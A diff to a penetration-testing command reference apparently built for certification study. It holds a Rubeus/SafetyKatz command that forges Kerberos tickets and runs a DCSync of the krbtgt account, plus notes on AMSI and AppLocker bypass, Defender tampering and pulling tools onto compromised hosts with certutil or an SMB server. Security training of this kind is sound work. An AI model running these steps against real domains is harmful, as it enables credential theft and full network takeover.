@@ -13452,7 +13452,7 @@ const COMMAND_DATA = {
           "command": "Rubeus.exe asktgt /user:Administrator /aes256:<krbtgt_aes> /ptt ; dir \\\\dcorp-dc\\C$ ; SafetyKatz.exe \"lsadump::dcsync /user:dcorp\\krbtgt\" \"exit\""
         }
       ],
-      "notes": "PHASE ORDER matters: enumerate -> local admin -> find a DA session -> steal it -> DCSync -> cross-trust. TOP GOTCHAS: (1) Bypass AMSI/SBL BEFORE loading any .ps1 or the load fails silently. (2) Under Constrained Language Mode use the signed AD module + run compiled tools via Loader.exe, never dot-source .ps1. (3) AppLocker usually allows only C:\\Windows and C:\\Program Files - run from a writable subfolder or in-memory. (4) The DOUBLE HOP: a remote PSSession can't reach a 3rd host - use createnetonly + asktgt /ptt (crtp-double-hop). (5) Prefer /aes256 over /rc4 for all ticket ops (RC4 is a detection flag). (6) klist often; klist purge when switching identity. (7) Only tamper with Defender AFTER local admin, and prefer in-memory so you never touch it. (8) SID filtering blocks the EA-SID trick across FOREST trusts but not intra-forest (that's why child->parent works and cross-forest needs the trust key / links). (9) Silver ticket = no DC contact (quiet); Golden = full but noisier. LINKED CARDS use their ids above - search the id to open each.",
+      "notes": "PHASE ORDER matters: enumerate -> local admin -> find a DA session -> steal it -> DCSync -> cross-trust. TOP GOTCHAS: (1) Bypass AMSI/SBL BEFORE loading any .ps1 or the load fails silently. (2) Under Constrained Language Mode use the signed AD module + run compiled tools via Loader.exe, never dot-source .ps1. (3) AppLocker usually allows only C:\\Windows and C:\\Program Files - run from a writable subfolder or in-memory. (4) The DOUBLE HOP: a remote PSSession can't reach a 3rd host - use createnetonly + asktgt /ptt (crtp-double-hop). (5) Prefer /aes256 over /rc4 for all ticket ops (RC4 is a detection flag). (6) klist often; klist purge when switching identity. (7) Only tamper with Defender AFTER local admin, and prefer in-memory so you never touch it. (8) SID filtering blocks the EA-SID trick across FOREST trusts but not intra-forest (that's why child->parent works and cross-forest needs the trust key / links). (9) Silver ticket = no DC contact (quiet); Golden = full but noisier. (10) TOOL TRANSFER to the next box: host from your foothold (python3 -m http.server, hfs.exe, or sudo impacket-smbserver share . -smb2support) then pull with iwr/certutil/copy (see http-file-servers, win-smb-transfer, win-ps-download); or Copy-Item -ToSession over a PSSession; reach isolated hosts via crtp-portproxy-pivot. (11) Each NEW process/shell needs its own AMSI bypass - re-run it after createnetonly or a fresh session. LINKED CARDS use their ids above - search the id to open each.",
       "references": [
         {
           "title": "CRTP - Attacking and Defending Active Directory (course)",
@@ -91369,7 +91369,7 @@ const COMMAND_DATA = {
     }
   ],
   "totalCommands": 911,
-  "buildDate": "2026-09-08T23:04:49.101Z",
+  "buildDate": "2026-09-08T23:09:38.495Z",
   "certifications": [
     "CDSA",
     "CPTS",
